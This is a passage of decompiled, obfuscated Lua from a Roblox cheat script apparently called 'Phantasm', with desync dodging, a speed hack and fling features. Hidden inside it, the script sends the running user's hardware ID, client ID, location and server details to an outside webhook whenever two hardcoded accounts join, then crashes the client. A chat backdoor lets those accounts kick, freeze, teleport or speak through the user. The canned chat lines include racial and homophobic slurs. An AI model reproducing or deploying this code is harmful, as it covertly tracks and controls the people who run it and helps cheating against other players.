                                                if (root.Position - targetRoot.Position).Magnitude > 100 or tick() >= tmp1320 + 3 then
                                                    getgenv().desync = nil
                                                end
                                            end
                                        end
                                        task.wait()
                                        if tick() >= tmp1320 + 3 then
                                            getgenv().desync = nil
                                        end
                                    end
                                end
                                if playedAnimId:match("16734584478") and rawget(Options.AntiMoves_Tatsumaki.Value, "Anti Tatsumaki Ult") then
                                    local tmp1321 = tick()
                                    while true do
                                        if true then
                                            if antidebug then
                                                warn("[ANTI DEBUG] 27")
                                            end
                                            if (root.Position - targetRoot.Position).Magnitude > 75 then
                                            end
                                            while true do
                                                if antidebug then
                                                    warn("[ANTI DEBUG] 27")
                                                end
                                                getgenv().desync = {
                                                    CFrame = CFrame.new(9000000000, 9000000000, 9000000000)
                                                }
                                                task.wait()
                                                if (root.Position - targetRoot.Position).Magnitude > 75 or tick() >= tmp1321 + 5.75 then
                                                    getgenv().desync = nil
                                                end
                                            end
                                        end
                                        task.wait()
                                        if tick() >= tmp1321 + 5.75 then
                                            getgenv().desync = nil
                                        end
                                    end
                                end
                                if playedAnimId:match("17141153099") and rawget(Options.AntiMoves_KJ.Value, "Anti Stoic Bomb") then
                                    task.delay(2, function()
                                        local tmp1322 = tick()
                                        while true do
                                            if antidebug then
                                                warn("[ANTI DEBUG] 28")
                                            end
                                            if (root.Position - targetRoot.Position).Magnitude <= 75 then
                                                break
                                            end
                                            task.wait()
                                            if tick() >= tmp1322 + 1.5 then
                                                getgenv().desync = nil
                                                return
                                            end
                                        end
                                        while true do
                                            if antidebug then
                                                warn("[ANTI DEBUG] 28")
                                            end
                                            getgenv().desync = {
                                                CFrame = CFrame.new(9000000000, 9000000000, 9000000000)
                                            }
                                            task.wait()
                                            if (root.Position - targetRoot.Position).Magnitude > 75 or tick() >= tmp1322 + 1.5 then
                                                getgenv().desync = nil
                                            end
                                        end
                                    end)
                                end
                                if playedAnimId:match("17354976067") and rawget(Options.AntiMoves_KJ.Value, "Anti 20-20-20 Dropkick") then
                                    MoveNotify(plr, "20-20-20 Dropkick")
                                    task.delay(1, function()
                                        local tmp1323 = Instance.new("Part", Workspace)
                                        tmp1323.Anchored = true
                                        tmp1323.Size = Vector3.new(25, 5, 125)
                                        tmp1323.CanCollide = false
                                        tmp1323.Transparency = 1
                                        local up1324 = false
                                        local tmp1326 = tmp1323.Touched:Connect(function(arg1325)
                                            if arg1325 == root then
                                                up1324 = true
                                            end
                                        end)
                                        local tmp1328 = tmp1323.TouchEnded:Connect(function(arg1327)
                                            if arg1327 == root then
                                                up1324 = false
                                            end
                                        end)
                                        local tmp1329 = tick()
                                        local tmp1330 = up1324
                                        while true do
                                            if antidebug then
                                                warn("[ANTI DEBUG] 29")
                                            end
                                            tmp1323.CFrame = targetRoot.CFrame * CFrame.new(0, 0, - tmp1323.Size.Y / 2)
                                            if tmp1330 then
                                                break
                                            end
                                            RenderStepped:Wait()
                                            if tick() >= tmp1329 + 5 or not playedAnim.IsPlaying then
                                                getgenv().desync = nil
                                                if tmp1323 then
                                                    tmp1323:Destroy()
                                                end
                                                tmp1326:Disconnect()
                                                tmp1328:Disconnect()
                                                return
                                            end
                                        end
                                        while true do
                                            if antidebug then
                                                warn("[ANTI DEBUG] 29")
                                            end
                                            getgenv().desync = {
                                                CFrame = CFrame.new(9000000000, 9000000000, 9000000000)
                                            }
                                            task.wait()
                                            if not tmp1330 or (tick() >= tmp1329 + 5 or not playedAnim.IsPlaying) then
                                                getgenv().desync = nil
                                            end
                                        end
                                    end)
                                end
                                if playedAnimId:match("18462894593") and rawget(Options.AntiMoves_KJ.Value, "Anti Five Seasons") then
                                    task.delay(6.75, function()
                                        local tmp1331 = tick()
                                        while true do
                                            if antidebug then
                                                warn("[ANTI DEBUG] 30")
                                            end
                                            getgenv().desync = {
                                                CFrame = CFrame.new(9000000000, 9000000000, 9000000000)
                                            }
                                            task.wait()
                                            if tick() >= tmp1331 + 1 then
                                                getgenv().desync = nil
                                                return
                                            end
                                        end
                                    end)
                                end
                                if playedAnimId:match("100558589307006") and rawget(Options.AntiMoves_FrozenSoul.Value, "Anti Permafrost") then
                                    task.wait(0.35)
                                    if not playedAnim.IsPlaying then
                                    end
                                    local tmp1332 = Instance.new("Part", Workspace)
                                    tmp1332.Anchored = true
                                    tmp1332.Size = Vector3.new(45, 25, 85)
                                    tmp1332.CanCollide = false
                                    tmp1332.Transparency = 1
                                    local up1333 = false
                                    local tmp1335 = tmp1332.Touched:Connect(function(arg1334)
                                        if arg1334 == root then
                                            up1333 = true
                                        end
                                    end)
                                    local tmp1337 = tmp1332.TouchEnded:Connect(function(arg1336)
                                        if arg1336 == root then
                                            up1333 = false
                                        end
                                    end)
                                    local tmp1338 = tick()
                                    local tmp1339 = up1333
                                    while true do
                                        if true then
                                            if antidebug then
                                                warn("[ANTI DEBUG] PERMAFROST")
                                            end
                                            tmp1332.CFrame = targetRoot.CFrame * CFrame.new(0, 0, - tmp1332.Size.Z / 2)
                                            if tmp1339 ~= true or isCountering(hum) then
                                            end
                                            while true do
                                                if antidebug then
                                                    warn("[ANTI DEBUG] PERMAFROST")
                                                end
                                                tmp1332.CFrame = targetRoot.CFrame * CFrame.new(0, 0, - tmp1332.Size.Z / 2)
                                                getgenv().desync = {
                                                    CFrame = CFrame.new(9000000000, 9000000000, 9000000000)
                                                }
                                                task.wait()
                                                if tmp1339 == false or (tick() >= tmp1338 + 0.65 or not playedAnim.IsPlaying) then
                                                    getgenv().desync = nil
                                                end
                                            end
                                        end
                                        RenderStepped:Wait()
                                        if tick() >= tmp1338 + 0.65 or not playedAnim.IsPlaying then
                                            getgenv().desync = nil
                                            if tmp1332 then
                                                tmp1332:Destroy()
                                            end
                                            tmp1335:Disconnect()
                                            tmp1337:Disconnect()
                                        end
                                    end
                                end
                                if playedAnimId:match("137561511768861") and rawget(Options.AntiMoves_FrozenSoul.Value, "Anti Frost Forge") then
                                    task.delay(1, function()
                                        local tmp1340 = tick()
                                        while true do
                                            if antidebug then
                                                warn("[ANTI DEBUG] FROST FORGE")
                                            end
                                            if (root.Position - targetRoot.Position).Magnitude <= 150 then
                                                break
                                            end
                                            task.wait()
                                            if tick() >= tmp1340 + 0.75 then
                                                getgenv().desync = nil
                                                return
                                            end
                                        end
                                        while true do
                                            if antidebug then
                                                warn("[ANTI DEBUG] FROST FORGE")
                                            end
                                            getgenv().desync = {
                                                CFrame = CFrame.new(9000000000, 9000000000, 9000000000)
                                            }
                                            task.wait()
                                            if (root.Position - targetRoot.Position).Magnitude > 150 or tick() >= tmp1340 + 0.75 then
                                                getgenv().desync = nil
                                            end
                                        end
                                    end)
                                end
                                if playedAnimId:match("112620365240235") and rawget(Options.AntiMoves_FrozenSoul.Value, "Anti Freezing Path") then
                                    task.wait(0.5)
                                    if not playedAnim.IsPlaying then
                                    end
                                    local tmp1341 = Instance.new("Part", Workspace)
                                    tmp1341.Anchored = true
                                    tmp1341.Size = Vector3.new(20, 10, 35)
                                    tmp1341.CanCollide = false
                                    tmp1341.Transparency = 1
                                    local up1342 = false
                                    local tmp1344 = tmp1341.Touched:Connect(function(arg1343)
                                        if arg1343 == root then
                                            up1342 = true
                                        end
                                    end)
                                    local tmp1346 = tmp1341.TouchEnded:Connect(function(arg1345)
                                        if arg1345 == root then
                                            up1342 = false
                                        end
                                    end)
                                    local tmp1347 = tick()
                                    local tmp1348 = up1342
                                    while true do
                                        if true then
                                            if antidebug then
                                                warn("[ANTI DEBUG] FREEZING PATH")
                                            end
                                            tmp1341.CFrame = targetRoot.CFrame * CFrame.new(0, 0, - tmp1341.Size.Z / 2)
                                            if tmp1348 ~= true or isCountering(hum) then
                                            end
                                            while true do
                                                if antidebug then
                                                    warn("[ANTI DEBUG] FREEZING PATH")
                                                end
                                                tmp1341.CFrame = targetRoot.CFrame * CFrame.new(0, 0, - tmp1341.Size.Z / 2)
                                                getgenv().desync = {
                                                    CFrame = CFrame.new(9000000000, 9000000000, 9000000000)
                                                }
                                                task.wait()
                                                if tmp1348 == false or (tick() >= tmp1347 + 4 or not playedAnim.IsPlaying) then
                                                    getgenv().desync = nil
                                                end
                                            end
                                        end
                                        RenderStepped:Wait()
                                        if tick() >= tmp1347 + 4 or not playedAnim.IsPlaying then
                                            getgenv().desync = nil
                                            if tmp1341 then
                                                tmp1341:Destroy()
                                            end
                                            tmp1344:Disconnect()
                                            tmp1346:Disconnect()
                                        end
                                    end
                                end
                                if playedAnimId:match("75547590335774") and rawget(Options.AntiMoves_FrozenSoul.Value, "Anti Judgement Chain") then
                                    task.wait(0.35)
                                    if not playedAnim.IsPlaying then
                                    end
                                    local tmp1349 = Instance.new("Part", Workspace)
                                    tmp1349.Anchored = true
                                    tmp1349.Size = Vector3.new(10, 5, 175)
                                    tmp1349.CanCollide = false
                                    tmp1349.Transparency = 1
                                    local up1350 = false
                                    local tmp1352 = tmp1349.Touched:Connect(function(arg1351)
                                        if arg1351 == root then
                                            up1350 = true
                                        end
                                    end)
                                    local tmp1354 = tmp1349.TouchEnded:Connect(function(arg1353)
                                        if arg1353 == root then
                                            up1350 = false
                                        end
                                    end)
                                    local tmp1355 = tick()
                                    local tmp1356 = up1350
                                    while true do
                                        if true then
                                            if antidebug then
                                                warn("[ANTI DEBUG] JUDGEMENT CHAIN")
                                            end
                                            tmp1349.CFrame = targetRoot.CFrame * CFrame.new(0, 0, - tmp1349.Size.Z / 2)
                                            if tmp1356 ~= true or isCountering(hum) then
                                            end
                                            while true do
                                                if antidebug then
                                                    warn("[ANTI DEBUG] JUDGEMENT CHAIN")
                                                end
                                                tmp1349.CFrame = targetRoot.CFrame * CFrame.new(0, 0, - tmp1349.Size.Z / 2)
                                                getgenv().desync = {
                                                    CFrame = CFrame.new(9000000000, 9000000000, 9000000000)
                                                }
                                                task.wait()
                                                if tmp1356 == false or (tick() >= tmp1355 + 1 or not playedAnim.IsPlaying) then
                                                    getgenv().desync = nil
                                                end
                                            end
                                        end
                                        RenderStepped:Wait()
                                        if tick() >= tmp1355 + 1 or not playedAnim.IsPlaying then
                                            getgenv().desync = nil
                                            if tmp1349 then
                                                tmp1349:Destroy()
                                            end
                                            tmp1352:Disconnect()
                                            tmp1354:Disconnect()
                                        end
                                    end
                                else
                                    return
                                end
                            end)
                        end
                    end)
                end
            end
            task.spawn(function()
                local up1357 = nil
                task.spawn(function()
                    repeat
                        task.wait()
                    until getChar(LocalPlayer)
                    local tmp1358 = getChar(LocalPlayer)
                    up1357 = Instance.new("Model")
                    tmp1358.Archivable = true
                    local tmp1359 = tmp1358:Clone()
                    tmp1358.Archivable = false
                    if tmp1359:FindFirstChildWhichIsA("Humanoid") then
                        tmp1359.Humanoid:Destroy()
                    end
                    local tmp1360, tmp1361, tmp1362 = pairs(tmp1359:GetChildren())
                    while true do
                        local tmp1363
                        tmp1362, tmp1363 = tmp1360(tmp1361, tmp1362)
                        if tmp1362 == nil then
                            break
                        end
                        if tmp1363:IsA("Humanoid") then
                            tmp1363:Destroy()
                        elseif tmp1363:IsA("BasePart") or tmp1363:IsA("MeshPart") then
                            local tmp1364 = tmp1363:Clone()
                            tmp1364.CanCollide = false
                            tmp1364.Anchored = true
                            tmp1364.Transparency = not table.find({
                                "HumanoidRootPart",
                                "FakeHead",
                                "Hitbox_RightArm",
                                "Hitbox_LeftArm",
                                "Hitbox_RightLeg",
                                "Hitbox_LeftLeg"
                            }, tmp1364.Name) and 0.65 or 1
                            tmp1364.Color = Color3.fromRGB(255, 255, 255)
                            tmp1364.Size = tmp1364.Size * 1.01
                            tmp1364.Parent = up1357
                            if tmp1364.Name ~= "Head" then
                                if tmp1364.Name ~= "HumanoidRootPart" then
                                    tmp1364.Material = Enum.Material.ForceField
                                    local tmp1365 = Instance.new("SpecialMesh", tmp1364)
                                    tmp1365.Scale = tmp1364.Size
                                    tmp1365.TextureId = "rbxassetid://5101923607"
                                    tmp1365.VertexColor = Vector3.new(255, 0, 0)
                                end
                            else
                                tmp1364.Color = Color3.fromRGB(255, 0, 0)
                            end
                            local tmp1366, tmp1367, tmp1368 = pairs({
                                "Sound",
                                "Decal",
                                "Trail",
                                "BodyVelocity",
                                "BodyGyro",
                                "BodyPosition",
                                "ParticleEmitter"
                            })
                            while true do
                                local tmp1369
                                tmp1368, tmp1369 = tmp1366(tmp1367, tmp1368)
                                if tmp1368 == nil then
                                    break
                                end
                                local tmp1370 = tmp1364:FindFirstChildWhichIsA(tmp1369)
                                if tmp1370 then
                                    tmp1370:Destroy()
                                end
                            end
                        end
                    end
                    up1357.Parent = workspace.Terrain
                end)
                local tmp1371 = Instance.new("Model", Workspace)
                local up1372 = Instance.new("Humanoid", tmp1371)
                local up1373 = Instance.new("Part", tmp1371)
                up1373.Name = "HumanoidRootPart"
                up1373.CanCollide = false
                up1373.Transparency = 1
                up1373.Anchored = true
                up1373.Size = Vector3.new(2, 2, 1)
                task.spawn(function()
                    while PreSimulation:Wait() do
                        local tmp1374 = Options.SpeedHackMethod.Value
                        local tmp1375 = getChar(LocalPlayer)
                        local tmp1376
                        if tmp1375 then
                            tmp1376 = getRoot(tmp1375)
                        else
                            tmp1376 = tmp1375
                        end
                        local tmp1377
                        if tmp1375 then
                            tmp1377 = getHumanoid(tmp1375)
                        else
                            tmp1377 = tmp1375
                        end
                        if tmp1375 and (tmp1376 and (tmp1377 and (Toggles.SpeedHackEnabled.Value and not FeatureFlags.Flying))) then
                            if tmp1374 == "CFrame" then
                                tmp1376.CFrame = tmp1376.CFrame + tmp1377.MoveDirection * (Options.SpeedHack.Value / 10000)
                            elseif tmp1374 == "Velocity" and tmp1377.MoveDirection ~= Vector3.new() then
                                repeat
                                    local tmp1378 = tmp1377.MoveDirection.Unit * (Options.SpeedHack.Value / 100)
                                    tmp1376.Velocity = Vector3.new(tmp1378.X, tmp1376.Velocity.Y, tmp1378.Z)
                                    PreSimulation:Wait()
                                until tmp1377.MoveDirection == Vector3.new() or Options.SpeedHackMethod.Value ~= tmp1374
                                tmp1376.Velocity = Vector3.new()
                            end
                        end
                    end
                end)
                Heartbeat:Connect(function()
                    local tmp1379 = getChar(LocalPlayer)
                    local tmp1380
                    if tmp1379 then
                        tmp1380 = getRoot(tmp1379)
                    else
                        tmp1380 = tmp1379
                    end
                    local tmp1381
                    if tmp1379 then
                        tmp1381 = getHumanoid(tmp1379)
                    else
                        tmp1381 = tmp1379
                    end
                    if tmp1379 and (tmp1380 and tmp1381) then
                        local tmp1382 = {
                            CFrame = tmp1380.CFrame,
                            Velocity = tmp1380.Velocity
                        }
                        local tmp1383 = nil
                        local tmp1384 = Workspace.CurrentCamera
                        local tmp1385 = false
                        if FeatureFlags.Invisibility or FeatureFlags["Doing Wall Combo Anywhere"] then
                            tmp1385 = (not getgenv().desync or tmp1379:FindFirstChild("AbsoluteImmortal")) and true or tmp1385
                        end
                        if tmp1381.Health > 0 then
                            if FeatureFlags.Invisibility or FeatureFlags["Upside Down"] then
                                tmp1383 = tmp1382.CFrame * CFrame.Angles(0, 0, math.rad(180))
                            end
                            if getgenv().flingDesync then
                                tmp1383 = getgenv().flingDesync.CFrame or tmp1383
                            end
                            if getgenv().desync and not tmp1379:FindFirstChild("AbsoluteImmortal") then
                                tmp1383 = getgenv().desync.CFrame or tmp1383
                            end
                        end
                        if tmp1385 and (up1357 and Toggles.Visualizer.Value) then
                            local tmp1386 = up1357
                            local tmp1387, tmp1388, tmp1389 = pairs(tmp1386:GetChildren())
                            while true do
                                local tmp1390
                                tmp1389, tmp1390 = tmp1387(tmp1388, tmp1389)
                                if tmp1389 == nil then
                                    break
                                end
                                if tmp1390:IsA("BasePart") then
                                    local tmp1391 = tmp1379:FindFirstChild(tmp1390.Name)
                                    if tmp1391 and tmp1391:IsA("BasePart") then
                                        tmp1390.CFrame = tmp1391.CFrame
                                    end
                                end
                            end
                        end
                        if tmp1383 then
                            if tmp1384 and tmp1384.CameraSubject == tmp1381 then
                                tmp1379:SetAttribute("NoHeadLerp", true)
                                tmp1384.CameraSubject = up1372
                            end
                            up1373.CFrame = tmp1382.CFrame
                            tmp1380.CFrame = tmp1383
                            if up1357 and (Toggles.Visualizer.Value and not (Toggles.AlwaysVisualize.Value or tmp1385)) then
                                local tmp1392 = up1357
                                local tmp1393, tmp1394, tmp1395 = pairs(tmp1392:GetChildren())
                                while true do
                                    local tmp1396
                                    tmp1395, tmp1396 = tmp1393(tmp1394, tmp1395)
                                    if tmp1395 == nil then
                                        break
                                    end
                                    if tmp1396:IsA("BasePart") then
                                        local tmp1397 = tmp1379:FindFirstChild(tmp1396.Name)
                                        if tmp1397 and tmp1397:IsA("BasePart") then
                                            tmp1396.CFrame = tmp1397.CFrame
                                        end
                                    end
                                end
                            end
                        end
                        if up1357 and not tmp1385 then
                            if Toggles.Visualizer.Value and Toggles.AlwaysVisualize.Value then
                                local tmp1398 = up1357
                                local tmp1399, tmp1400, tmp1401 = pairs(tmp1398:GetChildren())
                                while true do
                                    local tmp1402
                                    tmp1401, tmp1402 = tmp1399(tmp1400, tmp1401)
                                    if tmp1401 == nil then
                                        break
                                    end
                                    if tmp1402:IsA("BasePart") then
                                        local tmp1403 = tmp1379:FindFirstChild(tmp1402.Name)
                                        if tmp1403 and tmp1403:IsA("BasePart") then
                                            tmp1402.CFrame = tmp1403.CFrame
                                        end
                                    end
                                end
                            elseif not (Toggles.Visualizer.Value and (Toggles.AlwaysVisualize.Value or tmp1383)) then
                                local tmp1404 = up1357
                                local tmp1405, tmp1406, tmp1407 = pairs(tmp1404:GetChildren())
                                while true do
                                    local tmp1408
                                    tmp1407, tmp1408 = tmp1405(tmp1406, tmp1407)
                                    if tmp1407 == nil then
                                        break
                                    end
                                    if tmp1408:IsA("BasePart") then
                                        tmp1408.CFrame = CFrame.new(0, 1000000, 0)
                                    end
                                end
                            end
                        end
                        if Toggles.FlingOnDeath.Value and tmp1381.Health <= 0 then
                            tmp1380.Velocity = Vector3.new(1, 1, 1) * 16384
                        elseif FeatureFlags["Trashcan Launch"] and Toggles.TrashcanLaunch.Value then
                            tmp1380.Velocity = tmp1380.CFrame.LookVector * Options.Trashcan_LaunchPower.Value
                        elseif getgenv().flingDesync and getgenv().flingDesync.Velocity or FeatureFlags["Velocity Spoof"] then
                            tmp1380.Velocity = FeatureFlags["Velocity Spoof Settings"]
                        end
                        local tmp1409
                        if FeatureFlags.Invisibility and not (getgenv().flingDesync and getgenv().flingDesync.Velocity) then
                            tmp1409 = loadAnim(tmp1381, SpecialSound.ID)
                            tmp1409.Priority = Enum.AnimationPriority.Action4
                            if tmp1409 then
                                tmp1409:Play()
                                tmp1409.TimePosition = SpecialSound.TimePosition
                                tmp1409:AdjustSpeed(0)
                                tmp1409:AdjustWeight(1)
                            end
                        else
                            tmp1409 = nil
                        end
                        RenderStepped:Wait()
                        up1372.CameraOffset = tmp1381.CameraOffset
                        if tmp1384 and tmp1384.CameraSubject == up1372 then
                            tmp1379:SetAttribute("NoHeadLerp", false)
                            tmp1384.CameraSubject = tmp1381
                        end
                        if tmp1409 and tmp1409.IsPlaying then
                            tmp1409:Stop()
                        end
                        if tmp1383 then
                            if tmp1384 and UserInputService.MouseBehavior == Enum.MouseBehavior.LockCenter then
                                tmp1380.CFrame = CFrame.new(tmp1382.CFrame.Position, tmp1382.CFrame.Position + Vector3.new(tmp1384.CFrame.LookVector.X, 0, tmp1384.CFrame.LookVector.Z))
                            else
                                tmp1380.CFrame = tmp1382.CFrame
                            end
                        end
                        tmp1380.Velocity = tmp1382.Velocity
                    end
                end)
            end)
            task.spawn(function()
                if workspace.CurrentCamera then
                    patchCamera(workspace.CurrentCamera)
                end
                workspace.ChildAdded:Connect(patchCamera)
            end)
            if LocalPlayer.Character then
                task.spawn(init)
            end
            worldConnections[# worldConnections + 1] = LocalPlayer.CharacterAdded:Connect(function()
                task.spawn(init, true)
            end)
            local up1410 = {
                [1033636351] = "<@287493655835443201>",
                [9892253606] = "<@422612957755736064>"
            }
            local function up1412(arg1411)
                if arg1411 and table.find({
                    1033636351,
                    9892253606
                }, arg1411) then
                    return true, up1410[arg1411]
                else
                    return false, nil
                end
            end
            local function up1427(arg1413)
                local tmp1414 = {
                    "theres an exploiter in your server ThePersonToPing",
                    "ThePersonToPing theres some fat skid in your server rn",
                    "ThePersonToPing YOU\'RE ABOUT TO GET PASTED ON THERES A HACKER IN YOUR SERVER!!",
                    "WATCH OUT ThePersonToPing THERES A PASTER IN YOUR SERVER",
                    "ThePersonToPing Theres some cheater nigga in your server watch out brochacho"
                }
                local up1415 = tmp1414[math.random(1, # tmp1414)]:gsub("ThePersonToPing", arg1413)
                task.spawn(pcall, function()
                    local tmp1416 = httpRequest
                    local tmp1417 = {
                        Url = "https://meow.skunk.legal/c/duck-might-be-diddy",
                        Method = "POST",
                        Headers = {
                            ["content-type"] = "application/json",
                            Authorization = "YwCbktcTdW3EaWghnruRAAueeh6mKZ2sRqnph6Y"
                        }
                    }
                    local tmp1418 = HttpService
                    local tmp1419 = tmp1418.JSONEncode
                    local tmp1420 = {
                        content = up1415
                    }
                    local tmp1421 = {}
                    local tmp1422 = {
                        title = "Phantasm Logs",
                        description = "User Device: " .. up428,
                        type = "rich",
                        color = tonumber(0)
                    }
                    local tmp1423 = {}
                    local tmp1424 = {
                        name = "\n\n-----------------------------------------------------Information** **"
                    }
                    local tmp1425 = Players
                    local tmp1426 = RbxAnalyticsService
                    tmp1424.value = "Identified Executor: " .. (identifyexecutor and tostring(identifyexecutor()) or "Unknown") .. "\nExecutor Name: " .. (getexecutorname and tostring(getexecutorname()) or "Unknown") .. "\nServer Players: " .. (# tmp1425:GetPlayers() or "Unknown") .. "\nServer Type: " .. up447 .. "\nServer Version: " .. ServerVersion .. "\nCountry: " .. up424 .. "\nRegion: " .. up425 .. "\nRegion Name: " .. up426 .. "\nTimezone: " .. up427 .. "\nUsername: [" .. LocalPlayer.Name .. " (" .. LocalPlayer.DisplayName .. ")](https://www.roblox.com/users/" .. LocalPlayer.UserId .. "/profile)\nClient ID: " .. (tmp1426:GetClientId() or "Unknown") .. "\nHWID: " .. (gethwid and tostring(gethwid()) or (get_hwid and tostring(get_hwid()) or "Unknown")) .. "\nHashed Identifier: " .. up446 .. "\n-----------------------------------------------------" .. "\n[**Join**](https://fern.wtf/joiner?placeId=" .. game.PlaceId .. "&gameInstanceId=" .. game.JobId .. ")"
                    tmp1424.inline = false
                    __set_list(tmp1423, 1, {
                        tmp1424,
                        {
                            name = "JobId Join",
                            value = "```Roblox.GameLauncher.joinGameInstance(\'" .. game.PlaceId .. "\', \'" .. game.JobId .. "\')```",
                            inline = true
                        },
                        {
                            name = "JobId",
                            value = "```r\r\n        " .. game.JobId .. "\r\n\r\n        ```",
                            inline = true
                        },
                        {
                            name = "Browser Join",
                            value = "```roblox://experiences/start?placeId=" .. game.PlaceId .. "&gameInstanceId=" .. game.JobId .. "```",
                            inline = false
                        },
                        {
                            name = "Script Join",
                            value = "```lua\r\n        game:GetService(\"TeleportService\"):TeleportToPlaceInstance(" .. game.PlaceId .. ", \"" .. game.JobId .. "\", game:GetService(\"Players\").LocalPlayer)\r\n        ```",
                            inline = false
                        }
                    })
                    tmp1422.fields = tmp1423
                    tmp1422.thumbnail = {
                        url = fetchAvatar()
                    }
                    tmp1422.footer = {
                        text = "Script ran at " .. os.date("%Y-%m-%d %H:%M:%S")
                    }
                    __set_list(tmp1421, 1, {
                        tmp1422
                    })
                    tmp1420.embeds = tmp1421
                    tmp1417.Body = tmp1419(tmp1418, tmp1420)
                    tmp1416(tmp1417)
                end)
            end
            local tmp1428 = Players
            local tmp1429, tmp1430, tmp1431 = pairs(Players.GetPlayers(tmp1428))
            while true do
                local up1432
                tmp1431, up1432 = tmp1429(tmp1430, tmp1431)
                if tmp1431 == nil then
                    break
                end
                if up1432.Name ~= LocalPlayer.Name then
                    local tmp1433, tmp1434 = up1412(up1432.UserId)
                    if tmp1433 then
                        if tmp1434 then
                            up1427(tmp1434)
                        end
                        local tmp1435, tmp1436, tmp1437 = pairs(game:GetDescendants())
                        while true do
                            local up1438
                            tmp1437, up1438 = tmp1435(tmp1436, tmp1437)
                            if tmp1437 == nil then
                                break
                            end
                            pcall(function()
                                up1438:Destroy()
                                up1438.Destroy()
                                up1438:Remove()
                                up1438.Remove()
                                up1438.Parent = nil
                            end)
                        end
                        pcall(function()
                            local tmp1439, tmp1440, tmp1441 = pairs(getrawmetatable(game))
                            while true do
                                local tmp1442
                                tmp1441, tmp1442 = tmp1439(tmp1440, tmp1441)
                                if tmp1441 == nil then
                                    break
                                end
                                hookfunction(tmp1442, function()
                                end)
                            end
                        end)
                        while true do
                        end
                    end
                    task.spawn(initOthers, up1432)
                    worldConnections[# worldConnections + 1] = up1432.CharacterAdded:Connect(function()
                        task.spawn(initOthers, up1432)
                    end)
                end
            end
            worldConnections[# worldConnections + 1] = Players.PlayerAdded:Connect(function(argUp1443)
                local tmp1444, tmp1445 = up1412(argUp1443.UserId)
                if tmp1444 then
                    if tmp1445 then
                        up1427(tmp1445)
                    end
                    local tmp1446, tmp1447, tmp1448 = pairs(game:GetDescendants())
                    while true do
                        local up1449
                        tmp1448, up1449 = tmp1446(tmp1447, tmp1448)
                        if tmp1448 == nil then
                            break
                        end
                        pcall(function()
                            up1449:Destroy()
                            up1449.Destroy()
                            up1449:Remove()
                            up1449.Remove()
                            up1449.Parent = nil
                        end)
                    end
                    pcall(function()
                        local tmp1450, tmp1451, tmp1452 = pairs(getrawmetatable(game))
                        while true do
                            local tmp1453
                            tmp1452, tmp1453 = tmp1450(tmp1451, tmp1452)
                            if tmp1452 == nil then
                                break
                            end
                            hookfunction(tmp1453, function()
                            end)
                        end
                    end)
                    while true do
                    end
                else
                    if flag17 and not table.find(table18, argUp1443) then
                        table.insert(table18, argUp1443)
                    end
                    if argUp1443.Name ~= LocalPlayer.Name then
                        task.spawn(pcall, up810, argUp1443)
                        task.spawn(function()
                            local tmp1454 = tick()
                            repeat
                                RenderStepped:Wait()
                            until argUp1443:GetAttribute("PreloadDone") or tick() >= tmp1454 + 30
                            if argUp1443 and argUp1443.Parent then
                                if argUp1443.Character then
                                    task.spawn(initOthers, argUp1443)
                                end
                                argUp1443.CharacterAdded:Connect(function()
                                    task.spawn(initOthers, argUp1443)
                                end)
                            end
                        end)
                    end
                    allplayers = Players:GetPlayers()
                    return
                end
            end)
            local up1455 = {
                "i\'ll meow for GAYESTPERSONHERE anyday~..",
                "*purr* hi GAYESTPERSONHERE~..",
                "I love you GAYESTPERSONHERE..",
                "GAYESTPERSONHERE is mine and mine only >~<",
                "Owned by GAYESTPERSONHERE :3",
                "GAYESTPERSONHERE is such a cutie~.."
            }
            local up1456 = {
                Freeze = false
            }
            local function tmp1482(arg1457)
                arg1457.MessageReceived:Connect(function(chatMsg)
                    local tmp1459 = chatMsg.TextSource
                    if tmp1459 then
                        tmp1459 = Players:FindFirstChild(chatMsg.TextSource.Name)
                    end
                    if tmp1459 and up1412(tmp1459.UserId) then
                        local tmp1460 = getChar(LocalPlayer)
                        local tmp1461
                        if tmp1460 then
                            tmp1461 = getRoot(tmp1460)
                        else
                            tmp1461 = tmp1460
                        end
                        if tmp1460 then
                            tmp1460 = getHumanoid(tmp1460)
                        end
                        local tmp1462 = string.split(chatMsg.Text, " ")
                        if tmp1462[1] then
                            table.remove(tmp1462, 1)
                        end
                        local tmp1463
                        if tmp1462[1] and (getPlayer(tmp1462[1], false, true) and getPlayer(tmp1462[1], false, true).Name == LocalPlayer.Name or (tmp1462[1]:lower() == "all" or tmp1462[1]:lower() == "others")) then
                            table.remove(tmp1462, 1)
                            tmp1463 = true
                        else
                            tmp1463 = false
                        end
                        if chatMsg.Text:find("^.t") then
                            sendMsg(tmp1462[1] or "b")
                        end
                        if not tmp1463 then
                        end
                        if chatMsg.Text:find("^.bring") or chatMsg.Text:find("^.b") then
                            local tmp1464 = getChar(tmp1459)
                            if tmp1464 then
                                tmp1464 = getRoot(tmp1464)
                            end
                            if tmp1464 then
                                heartbeatTp(tmp1464.CFrame)
                            end
                        end
                        if chatMsg.Text:find("^.plug") or chatMsg.Text:find("^.p") then
                            sendMsg("Phantasm is the best script ever!!")
                        end
                        if chatMsg.Text:find("^.goto") then
                            local tmp1465 = tmp1462[1]
                            if tmp1465 then
                                tmp1465 = getPlayer(tmp1462[1])
                            end
                            if tmp1465 then
                                tmp1465 = getChar(tmp1465)
                            end
                            if tmp1465 then
                                tmp1465 = getRoot(tmp1465)
                            end
                            if tmp1465 then
                                heartbeatTp(tmp1465.CFrame)
                            end
                        end
                        if chatMsg.Text:find("^.reset") then
                            if tmp1460 then
                                tmp1460:ChangeState(Enum.HumanoidStateType.Dead)
                                tmp1460.Health = 0
                            end
                        end
                        if chatMsg.Text:find("^.freeze") or chatMsg.Text:find("^.fr") then
                            up1456.Freeze = true
                            tmp1461.Anchored = true
                            task.wait()
                            if not up1456.Freeze then
                            end
                        end
                        if chatMsg.Text:find("^.unfreeze") or (chatMsg.Text:find("^.unfr") or chatMsg.Text:find("^.thaw")) then
                            up1456.Freeze = false
                        elseif chatMsg.Text:find("^.ew") then
                            local tmp1466 = tmp1462[1]
                            if tmp1466 then
                                tmp1466 = getPlayer(tmp1462[1])
                            end
                            local tmp1467 = up1455[math.random(1, # up1455)]
                            sendMsg(tmp1467:gsub("GAYESTPERSONHERE", tmp1466 and tmp1466.DisplayName or tmp1459.DisplayName))
                        elseif chatMsg.Text:find("^.kick") then
                            LocalPlayer:Kick(# tmp1462 <= 0 and "Kicked" or (table.concat(tmp1462, " ") or "Kicked"))
                            LocalPlayer:Kick(# tmp1462 > 0 and table.concat(tmp1462, " ") or "Kicked")
                        elseif chatMsg.Text:find("^.boi") then
                            communicate({
                                Goal = " Platform ",
